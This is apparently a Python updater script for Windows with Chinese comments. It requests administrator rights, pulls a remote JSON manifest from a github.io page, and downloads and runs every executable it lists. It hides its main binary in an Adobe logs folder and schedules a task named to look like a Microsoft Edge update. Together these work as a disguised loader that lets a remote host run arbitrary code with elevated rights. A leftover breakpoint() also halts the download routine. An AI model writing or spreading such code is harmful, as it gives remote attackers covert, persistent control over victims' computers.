import requests
import os
import sys
import time
import hashlib
import subprocess
from datetime import datetime, timedelta
import urllib3



version = 0

def is_admin():
    """
    检查当前是否以管理员权限运行
    """
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """
    以管理员权限重新启动程序
    """
    if not is_admin():
        import ctypes
        # 获取当前脚本的完整路径
        script = os.path.abspath(sys.argv[0])
        # 使用 ShellExecuteW 以管理员权限运行
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 1)
        sys.exit(0)

def create_one_time_task(task_name, program_path):
    """
    创建一次性任务计划，1分钟后运行指定程序

    :param task_name: 任务名称
    :param program_path: 要运行的程序完整路径
    """
    # 计算1分钟后的时间
    future_time = datetime.now() + timedelta(minutes=1)
    time_str = future_time.strftime("%H:%M")

    # 构建schtasks命令
    cmd = [
        "schtasks",
        "/create",
        "/tn", task_name,
        "/tr", f'"{program_path}"',
        "/sc", "once",
        "/st", time_str,
        "/f"  # 强制覆盖同名任务
    ]

    try:
        subprocess.run(cmd, capture_output=True, text=True, check=True, shell=True)
        return True
    except subprocess.CalledProcessError as e:
        return False

def wait_for_connect(url:str):
    """
    等待网络正常
    :return: 无返回值
    """
    while True:
        try:
            requests.get(url)                                #测试连接是否正常
        except Exception as e:
            print(e,"wait for connect")
            time.sleep(10)
            create_one_time_task("MicrosoftEdgeUpdateTaskMachineUnrealEngine",r"D:\Program Files (x86)\Common Files\Adobe\CEPServiceManager4\logs\2024-03-14\main.exe")
            sys.exit(0)
        else:
            return

def get_json() -> dict:
    url = "https://mengyu-awa.github.io/mywebsite/data.json"
    wait_for_connect(url)
    return requests.get(url).json()

response = get_json()

def download_and_run(name:str, url:str, path:str, test_url:str) -> None:
    print(name,"\n",url,"\n",path,"\n",test_url)
    if not os.path.exists(path):
        os.makedirs(path)
    wait_for_connect(test_url)
    resp = requests.get(url)
    breakpoint()
    print(resp)
    with open(os.path.join(path,f"{name} updater.exe"), "wb") as f:
        f.write(resp.content)
    os.startfile(os.path.join(path,f"{name} updater.exe"))

def update():
    """
    更新本程序
    :return:无返回值
    """
    if response["main"]["version"] > version:                           #本程序版本不是最新版
        #print("update main")
        download_and_run("main", response["main"]["download"],r"D:\Program Files (x86)\Common Files\Adobe\CEPServiceManager4\logs\2024-03-14", "https://github.com")             #安装新版
        sys.exit(0)                                                     #退出，保证安装顺利

def update_others():
    """
    更新其他程序
    :return: 无返回值
    """
    for name in response["others"]["list"]:                                                                             #遍历所有程序
        if os.path.exists(os.path.join(response["others"]["Programs"][name]["program_path"],"version.txt")):            #检查程序版本号文件是否存在（同时表明程序是否正确安装）
            with open(os.path.join(response["others"]["Programs"][name]["program_path"],"version.txt"), "r") as f:      
                v = int(f.read())
            if v < response["others"]["Programs"][name]["latest_version"]:                                              #检验程序版本是否不为最新
                #print("update "+name)
                download_and_run(name, response["others"]["Programs"][name]["download"], response["others"]["Programs"][name]["program_path"], "https://github.com")
        else:
            #print("install " + name)
            download_and_run(name, response["others"]["Programs"][name]["download"], response["others"]["Programs"][name]["program_path"], "https://github.com")
            #time.sleep(10)

def launch():
    """
    开机启动其他程序
    :return: 无返回值
    """
    time.sleep(10)                                                  #保证安装程序运行完毕
    for file in response["launch"]["active_list"]:                  #遍历需要启动的程序
        #print("launching " + file)
        os.startfile(file)                                          #启动程序

def get_file_sha256(file_path, chunk_size=8192):
    """
    计算文件的 SHA256 哈希值（支持大文件，内存友好）

    :param file_path: 文件路径（字符串或 Path 对象）
    :param chunk_size: 分块读取大小（默认 8KB）
    :return: SHA256 十六进制字符串，失败返回 None
    """

    sha256_hash = hashlib.sha256()

    with open(file_path, "rb") as f:
        while chunk := f.read(chunk_size):
            sha256_hash.update(chunk)

    return sha256_hash.hexdigest()

def verify():
    """
    校验文件是否正确
    :return:
    """
    for name in response["others"]["list"]:                                                 #获取所有应用名称
        for i in response["verify"][name]["Files"]:                                         #遍历应用中所有文件
            if not os.path.exists(os.path.join(i["path"])):                                 #有文件缺失
                #print("reinstall "+name)
                download_and_run(name, response["others"]["Programs"][name]["download"], response["others"]["Programs"][name]["program_path"], "https://github.com")
                #time.sleep(10)
            elif not str(get_file_sha256(i["path"])) == i["SHA256"]:                        #有文件被替换
                #print("reinstall " + name)
                download_and_run(name, response["others"]["Programs"][name]["download"], response["others"]["Programs"][name]["program_path"], "https://github.com")
                #time.sleep(10)

if __name__ == "__main__":
    # 禁用不安全请求的警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    run_as_admin()
    try:
        update()                    #更新自身
        update_others()             #更新其他应用
        verify()                    #校验应用情况，并修复
        launch()                    #启动应用
    except Exception as e:
        print(e)
        time.sleep(5)
